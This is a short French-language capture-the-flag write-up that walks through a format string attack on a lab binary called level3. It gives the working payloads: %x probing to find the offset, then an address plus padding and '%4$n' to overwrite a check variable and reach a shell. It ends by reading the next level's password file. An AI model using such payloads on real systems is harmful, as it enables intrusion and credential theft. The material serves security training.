On a encore un executable, on le disassemble
il a une fonction V
il y a fgets qui est protegé contre les buffer overflow

et qu'il a une comparaison de "64"
(qd on decompile, on voit que dans la fonction v il y a un system /bin/sh donc on veut acceder a ca, seulement le if compare une variable "m" a 64)

0x080484df <+59>:	cmp    $0x40,%eax

on cherche toute les variables du programme grace a "info variable" (car m n'est defini nul part dans les decompilations)
<!-- on cherche a savoir l'adresse de la variable m qui contient 64 avec print &m on obtient : 0x804988c (pas besoin)-->

mais il y a un printf qu'on va manipuler pour changer la variable a l'adresse 0x804988c, on peut donc faire un format string attack

le flag %x de printf permet de print l'adresse en format hexadécimal

on va essayer de trouver ou se trouve l'adresse avec 

(python -c 'print "CCCC %x %x %x %x %x %x"'; cat) | ./level3

python -c 'print "CCCC %x %x %x %x %x %x"' > /tmp/test
cat /tmp/test - | ./level3

la ou ca se repete c'est la 4 eme position (43434343) donc on va mettre l'adresse (little-endian) de la variable m qui est : \x8c\x98\x04\x08

python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit

on veut changer le contenu de M qui accepte que 64 bytes donc l'adresse M fait 4bytes il faut qu'on rajoute 60

python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit

on donne l'argument "%4$n" qui veut dire utilise l'argument 4 et utilise %n dessus (l'argument %n ecrit dans l'adresse donnee)

whoami

cat /home/user/level4/.pass